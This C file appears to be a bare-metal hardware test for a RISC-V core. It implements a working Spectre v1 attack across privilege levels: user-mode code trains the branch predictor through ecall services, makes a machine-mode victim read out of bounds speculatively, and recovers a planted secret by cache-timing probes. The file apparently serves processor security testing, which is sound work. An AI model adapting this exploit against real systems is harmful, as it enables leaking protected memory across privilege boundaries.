#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "../../spectre-v1/src/encoding.h"
#include "../../spectre-v1/src/cache-utils.h"

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 10
#endif

#ifndef ROUNDS
#define ROUNDS 1
#endif

#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 2
#endif

#ifndef SECRET_SZ
#define SECRET_SZ 3
#endif

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif

#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif

#ifndef FLUSH_LINES
#define FLUSH_LINES PROBE_ENTRIES
#endif

#ifndef CONTROL_ONLY
#define CONTROL_ONLY 0
#endif

#ifndef TRAP_SMOKE_EXIT
#define TRAP_SMOKE_EXIT 0
#endif

#ifndef ATTACKER_MPP
#define ATTACKER_MPP 0
#endif

#ifndef USE_AM_CTE
#define USE_AM_CTE 0
#endif

#ifndef DIRECT_SERVICE_CALL
#define DIRECT_SERVICE_CALL 0
#endif

#ifndef LOW_ECALL_SMOKE
#define LOW_ECALL_SMOKE 0
#endif

#ifndef DEBUG_TRAMPOLINE
#define DEBUG_TRAMPOLINE 0
#endif

#define PROBE_ENTRIES 256u
#define PROBE_STRIDE L1_BLOCK_SZ_BYTES

#define SVC_VICTIM 1u
#define SVC_FLUSH_PROBE 2u
#define SVC_EXIT 3u

#define MCAUSE_USER_ECALL 8u
#define MCAUSE_SUPERVISOR_ECALL 9u
#define SCAUSE_SUPERVISOR_ECALL 9u
#define MSTATUS_MPP_MASK (3ull << 11)

struct victim_region {
  uint8_t array1[16];
  uint8_t pad[64];
  uint8_t secret[16];
} __attribute__((packed, aligned(64)));

static struct victim_region b_region = {
  .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
  .secret = "S3CreT",
};

static volatile uint64_t b_array1_sz = 16;
static uint8_t __attribute__((aligned(4096))) a_probe[PROBE_ENTRIES * PROBE_STRIDE];
static uint8_t __attribute__((aligned(16))) u_stack[4096];

static volatile uint8_t m_dummy;
static volatile uint64_t trap_count;
static volatile uint64_t victim_call_count;
static volatile uint64_t flush_call_count;
static volatile uint64_t exit_call_count;
static volatile uint64_t bad_trap_count;
static volatile uint64_t last_mcause;
static volatile uint64_t last_mepc;
static volatile int attack_done;
static volatile int attack_status;
static uintptr_t saved_m_sp;

static uint8_t leaked_idx[SECRET_SZ][2];
static uint64_t leaked_score[SECRET_SZ][2];
static uint64_t active_threshold;

static inline uint64_t candidate_value(uint64_t idx)
{
  if (idx < 10)
    return '0' + idx;
  if (idx < 36)
    return 'A' + (idx - 10);
  return 'a' + (idx - 36);
}

static inline uint64_t candidate_probe_value(uint64_t idx)
{
  return candidate_value((idx * 17u + 13u) % 62u);
}

static int is_training_value(uint64_t value)
{
  for (uint64_t i = 0; i < sizeof(b_region.array1); ++i) {
    if (value == b_region.array1[i])
      return 1;
  }
  return 0;
}

static void top_two_idx(uint64_t *in, uint64_t count,
                        uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (uint64_t i = 0; i < count; ++i) {
    if (in[i] > out_score[0]) {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = in[i];
      out_idx[0] = i;
    } else if (in[i] > out_score[1]) {
      out_score[1] = in[i];
      out_idx[1] = i;
    }
  }
}

static void flush_probe_service(uint8_t *probe)
{
  for (uint64_t i = 0; i < FLUSH_LINES; ++i)
    xs_flush_cache_line(&probe[i * PROBE_STRIDE]);
  xs_fence();
}

static __attribute__((noinline)) void victim_service(uint64_t idx, volatile uint8_t *probe)
{
  uintptr_t base = (uintptr_t)b_region.array1;
  uintptr_t sz_ptr = (uintptr_t)&b_array1_sz;
  uintptr_t probe_base = (uintptr_t)probe;

  asm volatile(
      "ld    t0, 0(%[sz_ptr])\n"
      "slli  t0, t0, 4\n"
      "li    t6, 2\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "bltu  %[idx], t0, 1f\n"
      "j     2f\n"
      "1:\n"
      "add   t1, %[base], %[idx]\n"
      "lbu   t2, 0(t1)\n"
      "slli  t2, t2, 6\n"
      "add   t3, %[probe_base], t2\n"
      "lbu   t4, 0(t3)\n"
      "la    t5, m_dummy\n"
      "sb    t4, 0(t5)\n"
      "2:\n"
      :
      : [idx] "r"(idx),
        [base] "r"(base),
        [sz_ptr] "r"(sz_ptr),
        [probe_base] "r"(probe_base)
      : "t0", "t1", "t2", "t3", "t4", "t5", "t6", "memory");
}

void m_trap_dispatch(uint64_t cause, uint64_t epc,
                     uint64_t a0, uint64_t a1, uint64_t a7)
{
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;

#if TRAP_SMOKE_EXIT
  attack_status = 0;
  attack_done = 1;
  return;
#endif

  if (cause != MCAUSE_USER_ECALL && cause != MCAUSE_SUPERVISOR_ECALL) {
    bad_trap_count++;
    attack_status = 2;
    attack_done = 1;
    return;
  }

  if (a7 == SVC_VICTIM) {
    victim_call_count++;
    victim_service(a0, (volatile uint8_t *)a1);
  } else if (a7 == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (a7 == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }
}

void m_trap_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl m_trap_entry\n"
    "m_trap_entry:\n"
    "  addi sp, sp, -128\n"
    "  sd ra, 0(sp)\n"
    "  sd t0, 8(sp)\n"
    "  sd t1, 16(sp)\n"
    "  sd t2, 24(sp)\n"
    "  sd a0, 32(sp)\n"
    "  sd a1, 40(sp)\n"
    "  sd a2, 48(sp)\n"
    "  sd a3, 56(sp)\n"
    "  sd a4, 64(sp)\n"
    "  sd a5, 72(sp)\n"
    "  sd a6, 80(sp)\n"
    "  sd a7, 88(sp)\n"
    "  csrr a0, mcause\n"
    "  csrr a1, mepc\n"
    "  ld a2, 32(sp)\n"
    "  ld a3, 40(sp)\n"
    "  ld a4, 88(sp)\n"
    "  call m_trap_dispatch\n"
    "  la t0, attack_done\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 1f\n"
    "  csrr t0, mepc\n"
    "  addi t0, t0, 4\n"
    "  csrw mepc, t0\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 128\n"
    "  mret\n"
    "1:\n"
    "  la t0, machine_low_return\n"
    "  csrw mepc, t0\n"
    "  li t0, 0x1800\n"
    "  csrs mstatus, t0\n"
    "  mret\n");

void low_ecall_smoke_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl low_ecall_smoke_entry\n"
    "low_ecall_smoke_entry:\n"
    "  li a7, 3\n"
    "  li a0, 0\n"
    "  ecall\n"
    "1: j 1b\n");

static inline void svc_victim(uint64_t idx, volatile uint8_t *probe)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, idx, (uint64_t)probe, SVC_VICTIM);
#else
  register uint64_t a0 asm("a0") = idx;
  register uint64_t a1 asm("a1") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_VICTIM;
  asm volatile("ecall" : "+r"(a0) : "r"(a1), "r"(a7) : "memory");
#endif
}

static inline void svc_flush_probe(volatile uint8_t *probe)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, (uint64_t)probe, 0, SVC_FLUSH_PROBE);
#else
  register uint64_t a0 asm("a0") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_FLUSH_PROBE;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
#endif
}

static inline void svc_exit(uint64_t status)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, status, 0, SVC_EXIT);
  return;
#else
  register uint64_t a0 asm("a0") = status;
  register uint64_t a7 asm("a7") = SVC_EXIT;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
  __builtin_unreachable();
#endif
}

static __attribute__((noinline)) int attacker_run(void)
{
  uint64_t malicious_base =
      (uintptr_t)b_region.secret - (uintptr_t)b_region.array1;
  uint64_t local_status = 0;

#if CONTROL_ONLY
  svc_flush_probe(a_probe);
  svc_victim(0, a_probe);
  return 0;
#endif

  for (uint64_t len = 0; len < SECRET_SZ; ++len) {
    uint64_t results[PROBE_ENTRIES];
    for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
      results[i] = 0;

    for (uint64_t atk_round = 0; atk_round < ATTACK_SAME_ROUNDS; ++atk_round) {
      svc_flush_probe(a_probe);

      for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j) {
        uint64_t rand_idx = atk_round % b_array1_sz;
        uint64_t attack_idx = malicious_base + len;
        uint64_t pass_idx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xffffUL;
        pass_idx = pass_idx | (pass_idx >> 16);
        pass_idx = rand_idx ^ (pass_idx & (attack_idx ^ rand_idx));

        for (uint64_t k = 0; k < 30; ++k)
          asm volatile("" ::: "memory");

        svc_victim(pass_idx, a_probe);
      }

      for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
        uint64_t mixed_i = candidate_probe_value(i);
        if (is_training_value(mixed_i))
          continue;
        uint64_t elapsed = xs_probe_time(&a_probe[mixed_i * PROBE_STRIDE]);
        if (elapsed < active_threshold)
          results[mixed_i]++;
      }
    }

    top_two_idx(results, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
    if (leaked_idx[len][0] != b_region.secret[len] &&
        leaked_idx[len][1] != b_region.secret[len])
      local_status = 1;
  }

  return (int)local_status;
}

static __attribute__((noinline, noreturn, unused)) void attacker_entry(void)
{
  svc_exit((uint64_t)attacker_run());
  for (;;)
    asm volatile("wfi");
}

#if USE_AM_CTE
static _Context *service_ecall_handler(_Event *ev, _Context *ctx) __attribute__((unused));
static _Context *service_ecall_handler(_Event *ev, _Context *ctx)
{
  (void)ev;
  trap_count++;
  last_mcause = ctx->scause;
  last_mepc = ctx->sepc;
  ctx->sepc += 4;

  uint64_t svc = ctx->GPR1;
  uint64_t a0 = ctx->GPR2;
  uint64_t a1 = ctx->GPR3;

  if (svc == SVC_VICTIM) {
    victim_call_count++;
    victim_service(a0, (volatile uint8_t *)a1);
  } else if (svc == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (svc == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }

  return ctx;
}
#endif

static void enter_user_attacker(void) __attribute__((unused));
static void enter_user_attacker(void)
{
  uintptr_t user_sp = (uintptr_t)u_stack + sizeof(u_stack) - 16;
  uintptr_t mstatus;

#if DEBUG_TRAMPOLINE
  printf("[v1-priv-debug] enter_user_attacker begin\n");
#endif
  init_pmp();
#if DEBUG_TRAMPOLINE
  printf("[v1-priv-debug] init_pmp done\n");
#endif
  asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
  asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
  asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
  asm volatile("mv %0, sp" : "=r"(saved_m_sp));

  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | ((uint64_t)ATTACKER_MPP << 11);
  asm volatile("csrw mstatus, %0" :: "r"(mstatus) : "memory");
#if DEBUG_TRAMPOLINE
  printf("[v1-priv-debug] mret target=%p sp=%p mstatus=%p\n",
         LOW_ECALL_SMOKE ? low_ecall_smoke_entry : attacker_entry,
         (void *)user_sp, (void *)mstatus);
#endif

  asm volatile(
      "mv sp, %0\n"
      "csrw mepc, %1\n"
      "mret\n"
      ".globl machine_low_return\n"
      "machine_low_return:\n"
      "la t0, saved_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : "r"(user_sp), "r"((uintptr_t)(LOW_ECALL_SMOKE ? low_ecall_smoke_entry : attacker_entry))
      : "t0", "memory");
}

int main(void)
{
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    a_probe[i * PROBE_STRIDE] = 1;

  uint64_t measured_threshold = xs_calibrate_threshold(a_probe, PROBE_STRIDE);
  active_threshold = measured_threshold;
#if USE_FIXED_CACHE_HIT_THRESHOLD
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  if (active_threshold == 0)
    active_threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v1-priv] model=interface A=%s B=M pmp=off service=%s secret_sz=%d candidates=%d flush_lines=%d control_only=%d\n",
         ATTACKER_MPP == 0 ? "U" : "S",
         DIRECT_SERVICE_CALL ? "direct-dispatch" : (USE_AM_CTE ? "am-cte-ecall" : "machine-ecall"),
         SECRET_SZ, PROBE_CANDIDATES, FLUSH_LINES, CONTROL_ONLY);
  printf("[v1-priv] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v1-priv] service_return=no-secret direct_secret_access=not-attempted\n");
  printf("[v1-priv] b_array1=%p b_secret=%p malicious_base=%lu probe=%p\n",
         b_region.array1, b_region.secret,
         (uint64_t)((uintptr_t)b_region.secret - (uintptr_t)b_region.array1),
         a_probe);

#if DIRECT_SERVICE_CALL
  attack_status = attacker_run();
  attack_done = 1;
#elif USE_AM_CTE
  _cte_init(NULL);
  irq_handler_reg(SCAUSE_SUPERVISOR_ECALL, service_ecall_handler);
  attack_status = attacker_run();
  attack_done = 1;
#else
  enter_user_attacker();
#endif

  printf("[v1-priv] traps=%lu victim_calls=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
         trap_count, victim_call_count, flush_call_count, exit_call_count,
         bad_trap_count, last_mcause, (void *)last_mepc, attack_status);

  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    uint8_t guess = leaked_idx[i][0];
    uint8_t second = leaked_idx[i][1];
    uint8_t expected = b_region.secret[i];
    printf("[v1-priv] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
  }

  int pass = (attack_status == 0 && bad_trap_count == 0);
  printf("[v1-priv] check=%s\n", pass ? "PASS" : "FAIL");
  return pass ? 0 : 1;
}
